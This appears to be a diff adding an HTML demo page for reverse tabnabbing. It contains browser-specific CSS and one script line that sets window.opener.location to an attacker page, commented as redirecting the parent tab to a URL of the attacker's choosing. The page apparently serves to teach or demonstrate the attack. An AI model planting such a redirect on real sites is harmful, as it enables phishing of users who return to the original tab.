@@ -1,0 +1,67 @@
+<html>
+<head>
+<title>Demo 2 - Tab page</title>
+
+<style type="text/css">
+body {
+  background: yellow;
+  font-size: 30px;
+}
+
+#main {
+  color: red;
+}
+
+*::-ms-backdrop, #main { color: blue; }
+
+@media screen and (-ms-high-contrast: active), (-ms-high-contrast: none) {
+	#main { color:yellow; }
+  p.message {font-size: 20px;}
+}
+
+@media all and (-ms-high-contrast:none){
+     *::-ms-backdrop, #main { color: #A64DFF; font-weight: bold; vertical-align:  center;}
+}
+
+@-moz-document url-prefix(){
+    #main {
+        color: #000;
+    }
+  }
+
+div img {
+  width: 100%;
+}
+</style>
+<script type="text/javascript">
+console.dir(window);
+window.opener.location = "demo2-attackpage.html";
+
+//Tab napping - redirect parent page to url of attacker's choosing
+
+</script>
+
+
+
+</head>
+<body>
+
+
+
+<center>
+<h1>demo2-tab.html (Tab page - The link user clicked on from referring page)</h1>
+<h2> www.badsite.com (contains js redirect)</h2>
+
+
+</center>
+
+<div id="console">
+
+</div>
+
+
+</body>
+
+
+
+</html>
